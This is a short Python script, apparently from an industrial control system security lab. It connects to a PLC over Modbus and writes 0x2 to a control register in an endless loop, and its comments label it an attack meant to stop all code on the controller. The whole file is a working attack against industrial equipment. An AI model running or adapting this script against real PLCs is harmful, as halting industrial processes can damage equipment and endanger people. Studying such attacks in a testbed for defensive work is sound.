#!/usr/bin/env python

#########################################
# Imports
#########################################
# - Logging
import modbus
import logging

# - Attack communication
from modbus	import ClientModbus as Client
from modbus	import ConnectionException 

# - World environement
from world import *

#########################################
# Logging
#########################################
logging.basicConfig()
log = logging.getLogger()
log.setLevel(logging.INFO)

#####################################
# Stop all code
#####################################
client = Client(PLC_SERVER_IP, port=PLC_SERVER_PORT)
try:
    client.connect()
    while True:
        rq = client.write(PLC_RW_ADDR, 0x2) 
except KeyboardInterrupt:
    client.close()
except ConnectionException:
    print "Unable to connect / Connection lost"
